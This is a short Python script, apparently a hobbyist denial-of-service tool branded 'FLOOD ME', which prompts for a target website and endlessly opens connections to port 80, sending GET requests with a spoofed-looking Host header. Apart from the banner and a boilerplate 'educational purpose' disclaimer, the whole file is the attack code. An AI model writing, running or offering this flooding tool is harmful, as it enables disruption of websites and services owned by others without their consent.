
import threading
import socket


print('''
	888888 88      dP"Yb   dP"Yb  8888b.      8b    d8 888888 
	88__   88     dP   Yb dP   Yb  8I  Yb     88b  d88 88__   
	88""   88  .o Yb   dP Yb   dP  8I  dY     88YbdP88 88""   
	88     88ood8  YbodP   YbodP  8888Y"      88 YY 88 888888 

				  	[+] Gifted_By_Knowledgeless
	''')

print('''
				-----------------
				    Disclaimer 
				-----------------

	This Script Is Only For Educational Purpose. Author Knowledgeless Will Not
	Be Responsible For Anything. Use With Your Own Risk.
	''')


# Defining function to connect.
def floodMe(target, port):
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)								# Socket object creation
		s.connect((target, port))															# Establishing connection	
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))		# Sending requests
		s.sendto(("Host: " + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))			# Trying fakeIp
		s.close()
		global already_terminated 															# Global variable 
		already_terminated += 1															
		print("Terminated {}".format(already_terminated))									# Printing vlicks


if __name__ == "__main__":
	
	try: 
		target1 = input("Targeted Web Address: ")											# Input website
		target = socket.gethostbyname(target1)												# Grabing IP
		port = 80
		fake_ip = '182.21.20.32'											
		already_terminated = 0	

		thread = threading.Thread(target=floodMe(target, port))							# Function calling to flood
		thread.start()

	# Error handling

	except socket.gaierror:
		print("Website Not Found. Try Again!")
	except KeyboardInterrupt: 
		print("\n\nKeyboard Interrupted The Process..!\n")
